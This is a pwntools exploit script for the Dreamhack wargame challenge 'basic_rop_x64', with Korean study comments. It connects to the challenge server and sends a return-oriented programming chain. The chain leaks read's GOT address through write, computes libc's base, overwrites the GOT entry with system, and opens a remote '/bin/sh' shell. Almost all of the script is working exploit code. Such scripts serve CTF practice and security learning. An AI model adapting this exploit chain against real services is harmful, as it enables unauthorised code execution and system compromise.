from pwn import *
def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games",21885)
e = ELF("./basic_rop_x64")
libc = ELF("/home/alsshsskssl/study/basic_rop_x64/libc.so.6")


payload = b"A"*0x50
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
pop_rdx = 0x0000000000001b92
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']

# write(1, read_got, 0x400)
payload += p64(pop_rdi) + p64(0x0000000000000001)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)    #rsi를read_got로 r15는 걍 0으로
#rdx도 설정해야하는데 이미 rdx가 0x400으로 설정 되어있음
payload += p64(write_plt)
#read_got가 가리키는 주소를 뽑아서 write로 출력 근데 write가 rdi,rsi,rdx다 채워야할듯
#위에 페이로드가 실행되면 write로 주소 뽑아짐

#read(0, read_got, 0x400)   rdx는 충분히 커서 그냥 두면됨
payload += p64(pop_rdi) + p64(0)    #표준입력
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)
#위에 페이로드 실행시켜서 read_got를 사용자 입력으로 강제로 변경!(system_got로 변경할예정)

#read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)    #read_got조작할 때 뒤에 /bin/sh문자열도 넣어놔서 rdi설정할 때 쓰는거
payload += p64(read_plt)

print("line37")
p.send(payload)     #따로 나오는 문자열 없으니까 바로 send로 넣자
print("lint39")
#payload로 실행되는 read에 들어가는 입력
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
p.send(p64(system)+b"/bin/sh\x00")

p.interactive()
#gdb로 디버깅 해봐야할듯
